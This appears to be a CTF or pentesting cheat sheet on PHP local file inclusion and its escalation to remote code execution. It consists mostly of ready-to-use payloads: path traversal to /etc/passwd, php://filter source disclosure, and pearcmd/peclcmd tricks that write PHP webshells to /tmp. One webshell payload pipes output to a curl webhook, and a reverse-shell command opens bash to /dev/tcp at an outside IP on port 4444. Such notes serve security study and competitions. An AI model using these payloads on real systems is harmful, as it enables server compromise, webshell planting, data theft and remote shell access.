# LFI

* Basic:\
  `/etc/passwd`, `../../../../etc/passwd`
* PHP Wrapper:\
  `?page=php://filter/convert.base64-encode/resource=index.php`

[https://hackmd.io/@LightSheng/ByrFtyaQp](https://hackmd.io/@LightSheng/ByrFtyaQp)<br>

## Check Php Gadget

```
# deploy local with docker compose 

# after that on the terminal container

find -name "*.php"
```

## LFI2RCE via pearcmd / peclcmd

Note:&#x20;

```url
?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd.ph&/<?=system(‘whoami’)?>+../../../../../tmp/sudo_von.ph

?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd.ph&/<?=system(‘curl WEBHOOK |’)?>+../../../../../tmp/sudo_von.php

?+config-create+/&file=.././.././.././.././../usr/local/lib/./php/peclcmd.php&/<?=system(base64_decode('Y2F0IC9mbGFnX25lX2hpaGkudHh0'));?>+/tmp/hello.php
```

With Base64

```
/?+config-create+/&eHh4eD4qKipQRDl3YUhBZ2MzbHpkR1Z0S0NSZlIwVlVXMk50WkYwcE96czdQejRn<&kaibro=/usr/local/lib/php/pearcmd&/<meow>+/tmp/meoww.php

/?kaibro=php%3a//filter/read=string.strip_tags%7Cconvert.base64-decode%7Cstring.strip_tags%7Cconvert.base64-decode/resource=/tmp/meoww&cmd=/readflag
```

Revshell

```
curl "http://localhost/usr/local/lib/php/peclcmd.php?+run-tests+-i+-r\"system(hex2bin('$(hex "bash -c 'sh -i >& /dev/tcp/108.137.37.157/4444 0>&1'")'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt"

```

## LFI2RCE via php filter chain

{% content-ref url="php.md" %}
[php.md](php.md)
{% endcontent-ref %}

## Links

Detailed lfi2rce

{% embed url="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html" %}

Adv payload, pearcmd

{% embed url="https://hackmd.io/@LightSheng/ByrFtyaQp" %}

Log poisoning, basics payload

{% embed url="https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet" %}

